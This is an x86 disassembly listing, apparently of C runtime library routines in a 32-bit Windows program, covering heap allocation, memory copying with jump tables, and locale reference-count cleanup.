  4260f1:	test   esi,esi
  4260f3:	jne    0x4260f6
  4260f5:	inc    esi
  4260f6:	cmp    DWORD PTR ds:0x463c44,0x1
  4260fd:	je     0x426105
  4260ff:	add    esi,0xf
  426102:	and    esi,0xfffffff0
  426105:	push   esi
  426106:	push   0x0
  426108:	push   DWORD PTR ds:0x463c40
  42610e:	call   DWORD PTR ds:0x429038
  426114:	call   0x42546f
  426119:	ret    
  42611a:	mov    esi,DWORD PTR [ebp+0x8]
  42611d:	push   0x4
  42611f:	call   0x42555b
  426124:	pop    ecx
  426125:	ret    
  426126:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42612b:	ja     0x42614f
  42612d:	push   DWORD PTR [esp+0x4]
  426131:	call   0x4260ab
  426136:	test   eax,eax
  426138:	pop    ecx
  426139:	jne    0x426151
  42613b:	cmp    DWORD PTR [esp+0x8],eax
  42613f:	je     0x426151
  426141:	push   DWORD PTR [esp+0x4]
  426145:	call   0x427d12
  42614a:	test   eax,eax
  42614c:	pop    ecx
  42614d:	jne    0x42612d
  42614f:	xor    eax,eax
  426151:	ret    
  426152:	push   DWORD PTR ds:0x4638c8
  426158:	push   DWORD PTR [esp+0x8]
  42615c:	call   0x426126
  426161:	pop    ecx
  426162:	pop    ecx
  426163:	ret    
  426164:	int3   
  426165:	int3   
  426166:	int3   
  426167:	int3   
  426168:	int3   
  426169:	int3   
  42616a:	int3   
  42616b:	int3   
  42616c:	int3   
  42616d:	int3   
  42616e:	int3   
  42616f:	int3   
  426170:	push   ebp
  426171:	mov    ebp,esp
  426173:	push   edi
  426174:	push   esi
  426175:	mov    esi,DWORD PTR [ebp+0xc]
  426178:	mov    ecx,DWORD PTR [ebp+0x10]
  42617b:	mov    edi,DWORD PTR [ebp+0x8]
  42617e:	mov    eax,ecx
  426180:	mov    edx,ecx
  426182:	add    eax,esi
  426184:	cmp    edi,esi
  426186:	jbe    0x426190
  426188:	cmp    edi,eax
  42618a:	jb     0x42630c
  426190:	test   edi,0x3
  426196:	jne    0x4261ac
  426198:	shr    ecx,0x2
  42619b:	and    edx,0x3
  42619e:	cmp    ecx,0x8
  4261a1:	jb     0x4261cc
  4261a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261a5:	jmp    DWORD PTR [edx*4+0x4262bc]
  4261ac:	mov    eax,edi
  4261ae:	mov    edx,0x3
  4261b3:	sub    ecx,0x4
  4261b6:	jb     0x4261c4
  4261b8:	and    eax,0x3
  4261bb:	add    ecx,eax
  4261bd:	jmp    DWORD PTR [eax*4+0x4261d0]
  4261c4:	jmp    DWORD PTR [ecx*4+0x4262cc]
  4261cb:	nop
  4261cc:	jmp    DWORD PTR [ecx*4+0x426250]
  4261d3:	nop
  4261d4:	loopne 0x426237
  4261d6:	inc    edx
  4261d7:	add    BYTE PTR [edx+eiz*2],cl
  4261da:	inc    edx
  4261db:	add    BYTE PTR [eax],dh
  4261dd:	bound  eax,QWORD PTR [edx+0x0]
  4261e0:	and    edx,ecx
  4261e2:	mov    al,BYTE PTR [esi]
  4261e4:	mov    BYTE PTR [edi],al
  4261e6:	mov    al,BYTE PTR [esi+0x1]
  4261e9:	mov    BYTE PTR [edi+0x1],al
  4261ec:	mov    al,BYTE PTR [esi+0x2]
  4261ef:	shr    ecx,0x2
  4261f2:	mov    BYTE PTR [edi+0x2],al
  4261f5:	add    esi,0x3
  4261f8:	add    edi,0x3
  4261fb:	cmp    ecx,0x8
  4261fe:	jb     0x4261cc
  426200:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426202:	jmp    DWORD PTR [edx*4+0x4262bc]
  426209:	lea    ecx,[ecx+0x0]
  42620c:	and    edx,ecx
  42620e:	mov    al,BYTE PTR [esi]
  426210:	mov    BYTE PTR [edi],al
  426212:	mov    al,BYTE PTR [esi+0x1]
  426215:	shr    ecx,0x2
  426218:	mov    BYTE PTR [edi+0x1],al
  42621b:	add    esi,0x2
  42621e:	add    edi,0x2
  426221:	cmp    ecx,0x8
  426224:	jb     0x4261cc
  426226:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426228:	jmp    DWORD PTR [edx*4+0x4262bc]
  42622f:	nop
  426230:	and    edx,ecx
  426232:	mov    al,BYTE PTR [esi]
  426234:	mov    BYTE PTR [edi],al
  426236:	add    esi,0x1
  426239:	shr    ecx,0x2
  42623c:	add    edi,0x1
  42623f:	cmp    ecx,0x8
  426242:	jb     0x4261cc
  426244:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426246:	jmp    DWORD PTR [edx*4+0x4262bc]
  42624d:	lea    ecx,[ecx+0x0]
  426250:	mov    bl,0x62
  426252:	inc    edx
  426253:	add    BYTE PTR [eax-0x67ffbd9e],ah
  426259:	bound  eax,QWORD PTR [edx+0x0]
  42625c:	nop
  42625d:	bound  eax,QWORD PTR [edx+0x0]
  426260:	mov    BYTE PTR [edx+0x42],ah
  426263:	add    BYTE PTR [eax+0x78004262],al
  426269:	bound  eax,QWORD PTR [edx+0x0]
  42626c:	jo     0x4262d0
  42626e:	inc    edx
  42626f:	add    BYTE PTR [ebx-0x761b71bc],cl
  426275:	inc    esp
  426276:	(bad)  
  426277:	in     al,0x8b
  426279:	inc    esp
  42627a:	mov    gs,eax
  42627c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426280:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426284:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426288:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42628c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426290:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426294:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426298:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42629c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4262a0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4262a4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4262a8:	lea    eax,[ecx*4+0x0]
  4262af:	add    esi,eax
  4262b1:	add    edi,eax
  4262b3:	jmp    DWORD PTR [edx*4+0x4262bc]
  4262ba:	mov    edi,edi
  4262bc:	int3   
  4262bd:	bound  eax,QWORD PTR [edx+0x0]
  4262c0:	aam    0x62
  4262c2:	inc    edx
  4262c3:	add    al,ah
  4262c5:	bound  eax,QWORD PTR [edx+0x0]
  4262c8:	hlt    
  4262c9:	bound  eax,QWORD PTR [edx+0x0]
  4262cc:	mov    eax,DWORD PTR [ebp+0x8]
  4262cf:	pop    esi
  4262d0:	pop    edi
  4262d1:	leave  
  4262d2:	ret    
  4262d3:	nop
  4262d4:	mov    al,BYTE PTR [esi]
  4262d6:	mov    BYTE PTR [edi],al
  4262d8:	mov    eax,DWORD PTR [ebp+0x8]
  4262db:	pop    esi
  4262dc:	pop    edi
  4262dd:	leave  
  4262de:	ret    
  4262df:	nop
  4262e0:	mov    al,BYTE PTR [esi]
  4262e2:	mov    BYTE PTR [edi],al
  4262e4:	mov    al,BYTE PTR [esi+0x1]
  4262e7:	mov    BYTE PTR [edi+0x1],al
  4262ea:	mov    eax,DWORD PTR [ebp+0x8]
  4262ed:	pop    esi
  4262ee:	pop    edi
  4262ef:	leave  
  4262f0:	ret    
  4262f1:	lea    ecx,[ecx+0x0]
  4262f4:	mov    al,BYTE PTR [esi]
  4262f6:	mov    BYTE PTR [edi],al
  4262f8:	mov    al,BYTE PTR [esi+0x1]
  4262fb:	mov    BYTE PTR [edi+0x1],al
  4262fe:	mov    al,BYTE PTR [esi+0x2]
  426301:	mov    BYTE PTR [edi+0x2],al
  426304:	mov    eax,DWORD PTR [ebp+0x8]
  426307:	pop    esi
  426308:	pop    edi
  426309:	leave  
  42630a:	ret    
  42630b:	nop
  42630c:	lea    esi,[ecx+esi*1-0x4]
  426310:	lea    edi,[ecx+edi*1-0x4]
  426314:	test   edi,0x3
  42631a:	jne    0x426340
  42631c:	shr    ecx,0x2
  42631f:	and    edx,0x3
  426322:	cmp    ecx,0x8
  426325:	jb     0x426334
  426327:	std    
  426328:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42632a:	cld    
  42632b:	jmp    DWORD PTR [edx*4+0x426458]
  426332:	mov    edi,edi
  426334:	neg    ecx
  426336:	jmp    DWORD PTR [ecx*4+0x426408]
  42633d:	lea    ecx,[ecx+0x0]
  426340:	mov    eax,edi
  426342:	mov    edx,0x3
  426347:	cmp    ecx,0x4
  42634a:	jb     0x426358
  42634c:	and    eax,0x3
  42634f:	sub    ecx,eax
  426351:	jmp    DWORD PTR [eax*4+0x42635c]
  426358:	jmp    DWORD PTR [ecx*4+0x426458]
  42635f:	nop
  426360:	ins    BYTE PTR es:[edi],dx
  426361:	arpl   WORD PTR [edx+0x0],ax
  426364:	nop
  426365:	arpl   WORD PTR [edx+0x0],ax
  426368:	mov    eax,0x8a004263
  42636d:	inc    esi
  42636e:	add    esp,DWORD PTR [ebx]
  426370:	ror    DWORD PTR [eax-0x117cfcb9],1
  426376:	add    ecx,eax
  426378:	jmp    0x231e67f
  42637d:	cmp    ecx,0x8
  426380:	jb     0x426334
  426382:	std    
  426383:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426385:	cld    
  426386:	jmp    DWORD PTR [edx*4+0x426458]
  42638d:	lea    ecx,[ecx+0x0]
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	and    edx,ecx
  426395:	mov    BYTE PTR [edi+0x3],al
  426398:	mov    al,BYTE PTR [esi+0x2]
  42639b:	shr    ecx,0x2
  42639e:	mov    BYTE PTR [edi+0x2],al
  4263a1:	sub    esi,0x2
  4263a4:	sub    edi,0x2
  4263a7:	cmp    ecx,0x8
  4263aa:	jb     0x426334
  4263ac:	std    
  4263ad:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263af:	cld    
  4263b0:	jmp    DWORD PTR [edx*4+0x426458]
  4263b7:	nop
  4263b8:	mov    al,BYTE PTR [esi+0x3]
  4263bb:	and    edx,ecx
  4263bd:	mov    BYTE PTR [edi+0x3],al
  4263c0:	mov    al,BYTE PTR [esi+0x2]
  4263c3:	mov    BYTE PTR [edi+0x2],al
  4263c6:	mov    al,BYTE PTR [esi+0x1]
  4263c9:	shr    ecx,0x2
  4263cc:	mov    BYTE PTR [edi+0x1],al
  4263cf:	sub    esi,0x3
  4263d2:	sub    edi,0x3
  4263d5:	cmp    ecx,0x8
  4263d8:	jb     0x426334
  4263de:	std    
  4263df:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263e1:	cld    
  4263e2:	jmp    DWORD PTR [edx*4+0x426458]
  4263e9:	lea    ecx,[ecx+0x0]
  4263ec:	or     al,0x64
  4263ee:	inc    edx
  4263ef:	add    BYTE PTR [esp+eiz*2],dl
  4263f2:	inc    edx
  4263f3:	add    BYTE PTR [esp+eiz*2],bl
  4263f6:	inc    edx
  4263f7:	add    BYTE PTR [esp+eiz*2],ah
  4263fa:	inc    edx
  4263fb:	add    BYTE PTR [esp+eiz*2],ch
  4263fe:	inc    edx
  4263ff:	add    BYTE PTR [esp+eiz*2],dh
  426402:	inc    edx
  426403:	add    BYTE PTR [esp+eiz*2],bh
  426406:	inc    edx
  426407:	add    BYTE PTR [edi+0x64],cl
  42640a:	inc    edx
  42640b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426411:	inc    esp
  426412:	(bad)  
  426413:	sbb    al,0x8b
  426415:	inc    esp
  426416:	mov    ds,WORD PTR [eax]
  426418:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42641c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426420:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426424:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426428:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42642c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426430:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426434:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426438:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42643c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426440:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426444:	lea    eax,[ecx*4+0x0]
  42644b:	add    esi,eax
  42644d:	add    edi,eax
  42644f:	jmp    DWORD PTR [edx*4+0x426458]
  426456:	mov    edi,edi
  426458:	push   0x70004264
  42645d:	fs inc edx
  42645f:	add    BYTE PTR [eax-0x6bffbd9c],al
  426465:	fs inc edx
  426467:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42646d:	leave  
  42646e:	ret    
  42646f:	nop
  426470:	mov    al,BYTE PTR [esi+0x3]
  426473:	mov    BYTE PTR [edi+0x3],al
  426476:	mov    eax,DWORD PTR [ebp+0x8]
  426479:	pop    esi
  42647a:	pop    edi
  42647b:	leave  
  42647c:	ret    
  42647d:	lea    ecx,[ecx+0x0]
  426480:	mov    al,BYTE PTR [esi+0x3]
  426483:	mov    BYTE PTR [edi+0x3],al
  426486:	mov    al,BYTE PTR [esi+0x2]
  426489:	mov    BYTE PTR [edi+0x2],al
  42648c:	mov    eax,DWORD PTR [ebp+0x8]
  42648f:	pop    esi
  426490:	pop    edi
  426491:	leave  
  426492:	ret    
  426493:	nop
  426494:	mov    al,BYTE PTR [esi+0x3]
  426497:	mov    BYTE PTR [edi+0x3],al
  42649a:	mov    al,BYTE PTR [esi+0x2]
  42649d:	mov    BYTE PTR [edi+0x2],al
  4264a0:	mov    al,BYTE PTR [esi+0x1]
  4264a3:	mov    BYTE PTR [edi+0x1],al
  4264a6:	mov    eax,DWORD PTR [ebp+0x8]
  4264a9:	pop    esi
  4264aa:	pop    edi
  4264ab:	leave  
  4264ac:	ret    
  4264ad:	push   DWORD PTR [esp+0x4]
  4264b1:	call   DWORD PTR ds:0x429108
  4264b7:	xor    eax,eax
  4264b9:	inc    eax
  4264ba:	ret    0x8
  4264bd:	push   0x10
  4264bf:	push   0x429710
  4264c4:	call   0x425434
  4264c9:	mov    eax,ds:0x463888
  4264ce:	test   eax,eax
  4264d0:	jne    0x426509
  4264d2:	cmp    DWORD PTR ds:0x4635c4,0x1
  4264d9:	je     0x4264ff
  4264db:	push   0x4296fc
  4264e0:	call   DWORD PTR ds:0x42902c
  4264e6:	test   eax,eax
  4264e8:	je     0x4264ff
  4264ea:	push   0x4296d4
  4264ef:	push   eax
  4264f0:	call   DWORD PTR ds:0x429028
  4264f6:	mov    ds:0x463888,eax
  4264fb:	test   eax,eax
  4264fd:	jne    0x426509
  4264ff:	mov    eax,0x4264ad
  426504:	mov    ds:0x463888,eax
  426509:	and    DWORD PTR [ebp-0x4],0x0
  42650d:	push   DWORD PTR [ebp+0xc]
  426510:	push   DWORD PTR [ebp+0x8]
  426513:	call   eax
  426515:	mov    DWORD PTR [ebp-0x1c],eax
  426518:	jmp    0x42653e
  42651a:	mov    eax,DWORD PTR [ebp-0x14]
  42651d:	mov    eax,DWORD PTR [eax]
  42651f:	mov    eax,DWORD PTR [eax]
  426521:	mov    DWORD PTR [ebp-0x20],eax
  426524:	xor    eax,eax
  426526:	inc    eax
  426527:	ret    
  426528:	mov    esp,DWORD PTR [ebp-0x18]
  42652b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426532:	jne    0x42653c
  426534:	push   0x8
  426536:	call   DWORD PTR ds:0x4290d4
  42653c:	xor    eax,eax
  42653e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426542:	call   0x42546f
  426547:	ret    
  426548:	push   0x10
  42654a:	push   0x429720
  42654f:	call   0x425434
  426554:	mov    esi,DWORD PTR [ebp+0x8]
  426557:	imul   esi,DWORD PTR [ebp+0xc]
  42655b:	mov    DWORD PTR [ebp-0x1c],esi
  42655e:	test   esi,esi
  426560:	jne    0x426563
  426562:	inc    esi
  426563:	xor    edi,edi
  426565:	mov    DWORD PTR [ebp-0x20],edi
  426568:	cmp    esi,0xffffffe0
  42656b:	ja     0x4265d2
  42656d:	cmp    DWORD PTR ds:0x463c44,0x3
  426574:	jne    0x4265bd
  426576:	add    esi,0xf
  426579:	and    esi,0xfffffff0
  42657c:	mov    DWORD PTR [ebp+0xc],esi
  42657f:	mov    ebx,DWORD PTR [ebp-0x1c]
  426582:	cmp    ebx,DWORD PTR ds:0x463a04
  426588:	ja     0x4265bd
  42658a:	push   0x4
  42658c:	call   0x4255ef
  426591:	pop    ecx
  426592:	and    DWORD PTR [ebp-0x4],edi
  426595:	push   ebx
  426596:	call   0x426ff1
  42659b:	pop    ecx
  42659c:	mov    DWORD PTR [ebp-0x20],eax
  42659f:	or     DWORD PTR [ebp-0x4],0xffffffff
  4265a3:	call   0x4265f2
  4265a8:	mov    edi,DWORD PTR [ebp-0x20]
  4265ab:	test   edi,edi
  4265ad:	je     0x4265c1
  4265af:	push   DWORD PTR [ebp-0x1c]
  4265b2:	push   0x0
  4265b4:	push   edi
  4265b5:	call   0x427d30
  4265ba:	add    esp,0xc
  4265bd:	test   edi,edi
  4265bf:	jne    0x4265fb
  4265c1:	push   esi
  4265c2:	push   0x8
  4265c4:	push   DWORD PTR ds:0x463c40
  4265ca:	call   DWORD PTR ds:0x429038
  4265d0:	mov    edi,eax
  4265d2:	test   edi,edi
  4265d4:	jne    0x4265fb
  4265d6:	cmp    DWORD PTR ds:0x4638c8,edi
  4265dc:	je     0x4265fb
  4265de:	push   esi
  4265df:	call   0x427d12
  4265e4:	pop    ecx
  4265e5:	test   eax,eax
  4265e7:	jne    0x426563
  4265ed:	jmp    0x4265fd
  4265ef:	mov    esi,DWORD PTR [ebp+0xc]
  4265f2:	push   0x4
  4265f4:	call   0x42555b
  4265f9:	pop    ecx
  4265fa:	ret    
  4265fb:	mov    eax,edi
  4265fd:	call   0x42546f
  426602:	ret    
  426603:	push   esi
  426604:	mov    esi,DWORD PTR [esp+0x8]
  426608:	mov    eax,DWORD PTR [esi+0x3c]
  42660b:	push   edi
  42660c:	xor    edi,edi
  42660e:	cmp    eax,DWORD PTR ds:0x4638d4
  426614:	je     0x426679
  426616:	cmp    eax,edi
  426618:	je     0x426679
  42661a:	mov    eax,DWORD PTR [esi+0x2c]
  42661d:	cmp    DWORD PTR [eax],edi
  42661f:	jne    0x426679
  426621:	mov    eax,DWORD PTR [esi+0x34]
  426624:	cmp    eax,edi
  426626:	je     0x426644
  426628:	cmp    DWORD PTR [eax],edi
  42662a:	jne    0x426644
  42662c:	cmp    eax,DWORD PTR ds:0x4639f0
  426632:	je     0x426644
  426634:	push   eax
  426635:	call   0x42603a
  42663a:	push   DWORD PTR [esi+0x3c]
  42663d:	call   0x427f7f
  426642:	pop    ecx
  426643:	pop    ecx
  426644:	mov    eax,DWORD PTR [esi+0x30]
  426647:	cmp    eax,edi
  426649:	je     0x426667
  42664b:	cmp    DWORD PTR [eax],edi
  42664d:	jne    0x426667
  42664f:	cmp    eax,DWORD PTR ds:0x4639f4
  426655:	je     0x426667
  426657:	push   eax
  426658:	call   0x42603a
  42665d:	push   DWORD PTR [esi+0x3c]
  426660:	call   0x427f20
  426665:	pop    ecx
  426666:	pop    ecx
  426667:	push   DWORD PTR [esi+0x2c]
  42666a:	call   0x42603a
  42666f:	push   DWORD PTR [esi+0x3c]
  426672:	call   0x42603a
  426677:	pop    ecx
  426678:	pop    ecx
  426679:	mov    eax,DWORD PTR [esi+0x40]
  42667c:	cmp    eax,DWORD PTR ds:0x4639ec
  426682:	je     0x42669c
  426684:	cmp    eax,edi
  426686:	je     0x42669c
  426688:	cmp    DWORD PTR [eax],edi
  42668a:	jne    0x42669c
  42668c:	push   eax
  42668d:	call   0x42603a
  426692:	push   DWORD PTR [esi+0x44]
  426695:	call   0x42603a
  42669a:	pop    ecx
  42669b:	pop    ecx
  42669c:	mov    eax,DWORD PTR [esi+0x50]
  42669f:	cmp    eax,DWORD PTR ds:0x4638d0
  4266a5:	je     0x4266c3
  4266a7:	cmp    eax,edi
  4266a9:	je     0x4266c3
  4266ab:	cmp    DWORD PTR [eax+0xb4],edi
  4266b1:	jne    0x4266c3
  4266b3:	push   eax
  4266b4:	call   0x427d90
  4266b9:	push   DWORD PTR [esi+0x50]
  4266bc:	call   0x42603a
  4266c1:	pop    ecx
  4266c2:	pop    ecx
  4266c3:	push   esi
  4266c4:	call   0x42603a
  4266c9:	pop    ecx
  4266ca:	pop    edi
  4266cb:	pop    esi
  4266cc:	ret    
  4266cd:	push   esi
  4266ce:	call   0x4252e9
  4266d3:	mov    esi,eax
  4266d5:	mov    eax,DWORD PTR [esi+0x64]
  4266d8:	cmp    eax,DWORD PTR ds:0x46308c
  4266de:	je     0x42678a
  4266e4:	test   eax,eax
  4266e6:	je     0x426717
  4266e8:	mov    ecx,DWORD PTR [eax+0x2c]
  4266eb:	dec    DWORD PTR [eax]
  4266ed:	test   ecx,ecx
  4266ef:	je     0x4266f3
  4266f1:	dec    DWORD PTR [ecx]
  4266f3:	mov    ecx,DWORD PTR [eax+0x34]
  4266f6:	test   ecx,ecx
  4266f8:	je     0x4266fc
  4266fa:	dec    DWORD PTR [ecx]
  4266fc:	mov    ecx,DWORD PTR [eax+0x30]
  4266ff:	test   ecx,ecx
  426701:	je     0x426705
  426703:	dec    DWORD PTR [ecx]
  426705:	mov    ecx,DWORD PTR [eax+0x40]
  426708:	test   ecx,ecx
  42670a:	je     0x42670e
  42670c:	dec    DWORD PTR [ecx]
  42670e:	mov    ecx,DWORD PTR [eax+0x4c]
  426711:	dec    DWORD PTR [ecx+0xb4]
  426717:	mov    ecx,DWORD PTR ds:0x46308c
  42671d:	mov    DWORD PTR [esi+0x64],ecx
  426720:	mov    ecx,DWORD PTR ds:0x46308c
  426726:	inc    DWORD PTR [ecx]
  426728:	mov    ecx,DWORD PTR ds:0x46308c
  42672e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426731:	test   ecx,ecx
  426733:	je     0x426737
  426735:	inc    DWORD PTR [ecx]
  426737:	mov    ecx,DWORD PTR ds:0x46308c
  42673d:	mov    ecx,DWORD PTR [ecx+0x34]
  426740:	test   ecx,ecx
  426742:	je     0x426746
  426744:	inc    DWORD PTR [ecx]
  426746:	mov    ecx,DWORD PTR ds:0x46308c
  42674c:	mov    ecx,DWORD PTR [ecx+0x30]
  42674f:	test   ecx,ecx
  426751:	je     0x426755
  426753:	inc    DWORD PTR [ecx]
  426755:	mov    ecx,DWORD PTR ds:0x46308c
  42675b:	mov    ecx,DWORD PTR [ecx+0x40]
  42675e:	test   ecx,ecx
  426760:	je     0x426764
  426762:	inc    DWORD PTR [ecx]
  426764:	mov    ecx,DWORD PTR ds:0x46308c
  42676a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42676d:	inc    DWORD PTR [ecx+0xb4]
  426773:	test   eax,eax
  426775:	je     0x42678a
  426777:	cmp    DWORD PTR [eax],0x0
  42677a:	jne    0x42678a
  42677c:	cmp    eax,0x463038
  426781:	je     0x42678a
  426783:	push   eax
  426784:	call   0x426603
  426789:	pop    ecx
  42678a:	mov    eax,DWORD PTR [esi+0x64]
  42678d:	pop    esi
  42678e:	ret    
  42678f:	push   0xc
  426791:	push   0x4298b0
  426796:	call   0x425434
  42679b:	push   0xc
  42679d:	call   0x4255ef
  4267a2:	pop    ecx
  4267a3:	and    DWORD PTR [ebp-0x4],0x0
  4267a7:	call   0x4266cd
  4267ac:	mov    DWORD PTR [ebp-0x1c],eax
  4267af:	or     DWORD PTR [ebp-0x4],0xffffffff
  4267b3:	call   0x4267c1
  4267b8:	mov    eax,DWORD PTR [ebp-0x1c]
  4267bb:	call   0x42546f
  4267c0:	ret    
  4267c1:	push   0xc
  4267c3:	call   0x42555b
  4267c8:	pop    ecx
  4267c9:	ret    
  4267ca:	push   0x140
  4267cf:	push   0x0
  4267d1:	push   DWORD PTR ds:0x463c40
  4267d7:	call   DWORD PTR ds:0x429038
  4267dd:	test   eax,eax
  4267df:	mov    ds:0x463a00,eax
  4267e4:	jne    0x4267e7
  4267e6:	ret    
  4267e7:	mov    ecx,DWORD PTR [esp+0x4]
  4267eb:	and    DWORD PTR ds:0x4639f8,0x0
  4267f2:	and    DWORD PTR ds:0x4639fc,0x0
  4267f9:	mov    ds:0x463a08,eax
  4267fe:	xor    eax,eax
  426800:	mov    DWORD PTR ds:0x463a04,ecx
  426806:	mov    DWORD PTR ds:0x463a0c,0x10
  426810:	inc    eax
  426811:	ret    
  426812:	mov    eax,ds:0x4639fc
  426817:	lea    ecx,[eax+eax*4]
  42681a:	mov    eax,ds:0x463a00
  42681f:	lea    ecx,[eax+ecx*4]
  426822:	jmp    0x426836
  426824:	mov    edx,DWORD PTR [esp+0x4]
  426828:	sub    edx,DWORD PTR [eax+0xc]
  42682b:	cmp    edx,0x100000
  426831:	jb     0x42683c
  426833:	add    eax,0x14
  426836:	cmp    eax,ecx
  426838:	jb     0x426824
  42683a:	xor    eax,eax
  42683c:	ret    
  42683d:	push   ebp
  42683e:	mov    ebp,esp
  426840:	sub    esp,0x10
  426843:	mov    ecx,DWORD PTR [ebp+0x8]
  426846:	mov    eax,DWORD PTR [ecx+0x10]
  426849:	push   esi
  42684a:	mov    esi,DWORD PTR [ebp+0xc]
  42684d:	push   edi
  42684e:	mov    edi,esi
  426850:	sub    edi,DWORD PTR [ecx+0xc]
  426853:	add    esi,0xfffffffc
  426856:	shr    edi,0xf
  426859:	mov    ecx,edi
  42685b:	imul   ecx,ecx,0x204
  426861:	lea    ecx,[ecx+eax*1+0x144]
  426868:	mov    DWORD PTR [ebp-0x10],ecx
  42686b:	mov    ecx,DWORD PTR [esi]
  42686d:	dec    ecx
  42686e:	test   cl,0x1
  426871:	mov    DWORD PTR [ebp-0x4],ecx
  426874:	jne    0x426b51
  42687a:	push   ebx
  42687b:	lea    ebx,[ecx+esi*1]
  42687e:	mov    edx,DWORD PTR [ebx]
  426880:	mov    DWORD PTR [ebp-0xc],edx
  426883:	mov    edx,DWORD PTR [esi-0x4]
  426886:	mov    DWORD PTR [ebp-0x8],edx
  426889:	mov    edx,DWORD PTR [ebp-0xc]
  42688c:	test   dl,0x1
  42688f:	mov    DWORD PTR [ebp+0xc],ebx
  426892:	jne    0x426908
  426894:	sar    edx,0x4
  426897:	dec    edx
  426898:	cmp    edx,0x3f
  42689b:	jbe    0x4268a0
  42689d:	push   0x3f
  42689f:	pop    edx
  4268a0:	mov    ecx,DWORD PTR [ebx+0x4]
  4268a3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4268a6:	jne    0x4268ea
  4268a8:	cmp    edx,0x20
  4268ab:	mov    ebx,0x80000000
  4268b0:	jae    0x4268cb
  4268b2:	mov    ecx,edx
  4268b4:	shr    ebx,cl
  4268b6:	lea    ecx,[edx+eax*1+0x4]
  4268ba:	not    ebx
  4268bc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4268c0:	dec    BYTE PTR [ecx]
  4268c2:	jne    0x4268e7
  4268c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4268c7:	and    DWORD PTR [ecx],ebx
  4268c9:	jmp    0x4268e7
  4268cb:	lea    ecx,[edx-0x20]
  4268ce:	shr    ebx,cl
  4268d0:	lea    ecx,[edx+eax*1+0x4]
  4268d4:	not    ebx
  4268d6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4268dd:	dec    BYTE PTR [ecx]
  4268df:	jne    0x4268e7
  4268e1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268e4:	and    DWORD PTR [ecx+0x4],ebx
  4268e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4268ea:	mov    edx,DWORD PTR [ebx+0x8]
  4268ed:	mov    ebx,DWORD PTR [ebx+0x4]
  4268f0:	mov    ecx,DWORD PTR [ebp-0x4]
  4268f3:	add    ecx,DWORD PTR [ebp-0xc]
  4268f6:	mov    DWORD PTR [edx+0x4],ebx
  4268f9:	mov    edx,DWORD PTR [ebp+0xc]
  4268fc:	mov    ebx,DWORD PTR [edx+0x4]
  4268ff:	mov    edx,DWORD PTR [edx+0x8]
  426902:	mov    DWORD PTR [ebx+0x8],edx
  426905:	mov    DWORD PTR [ebp-0x4],ecx
  426908:	mov    edx,ecx
  42690a:	sar    edx,0x4
  42690d:	dec    edx
  42690e:	cmp    edx,0x3f
  426911:	jbe    0x426916
  426913:	push   0x3f
  426915:	pop    edx
  426916:	mov    ebx,DWORD PTR [ebp-0x8]
  426919:	and    ebx,0x1
  42691c:	mov    DWORD PTR [ebp-0xc],ebx
  42691f:	jne    0x4269b4
  426925:	sub    esi,DWORD PTR [ebp-0x8]
  426928:	mov    ebx,DWORD PTR [ebp-0x8]
  42692b:	sar    ebx,0x4
  42692e:	push   0x3f
  426930:	mov    DWORD PTR [ebp+0xc],esi
  426933:	dec    ebx
  426934:	pop    esi
  426935:	cmp    ebx,esi
  426937:	jbe    0x42693b
  426939:	mov    ebx,esi
  42693b:	add    ecx,DWORD PTR [ebp-0x8]
  42693e:	mov    edx,ecx
  426940:	sar    edx,0x4
  426943:	dec    edx
  426944:	cmp    edx,esi
  426946:	mov    DWORD PTR [ebp-0x4],ecx
  426949:	jbe    0x42694d
  42694b:	mov    edx,esi
  42694d:	cmp    ebx,edx
  42694f:	je     0x4269af
  426951:	mov    ecx,DWORD PTR [ebp+0xc]
  426954:	mov    esi,DWORD PTR [ecx+0x4]
  426957:	cmp    esi,DWORD PTR [ecx+0x8]
  42695a:	jne    0x426997
  42695c:	cmp    ebx,0x20
  42695f:	mov    esi,0x80000000
  426964:	jae    0x42697d
  426966:	mov    ecx,ebx
  426968:	shr    esi,cl
  42696a:	not    esi
  42696c:	and    DWORD PTR [eax+edi*4+0x44],esi
